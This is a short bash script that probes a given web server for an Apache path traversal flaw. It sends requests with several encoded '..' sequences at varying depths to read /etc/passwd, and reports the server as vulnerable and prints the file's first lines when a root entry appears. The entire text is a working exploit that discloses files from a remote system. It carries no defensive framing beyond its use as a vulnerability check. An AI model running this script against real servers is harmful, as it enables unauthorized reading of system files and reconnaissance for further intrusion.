#!/usr/bin/env bash
TARGET="${1:?usage: bash httpd42013.sh http://TARGET:PORT}"
B="${TARGET%/}"
for enc in '%2e%2e' '.%2e' '%%32%65%%32%65'; do
  for depth in 3 5 8; do
    path=""
    for i in $(seq 1 $depth); do path="$path/$enc"; done
    url="$B$path/etc/passwd"
    out=$(curl -sS -m 8 --path-as-is "$url" 2>/dev/null | head -3)
    if printf '%s' "$out" | grep -q 'root:x:0:0'; then
      echo "VULN  $url"; printf '%s\n' "$out"; exit 0
    fi
  done
done
echo "SAFE/未命中"; exit 1
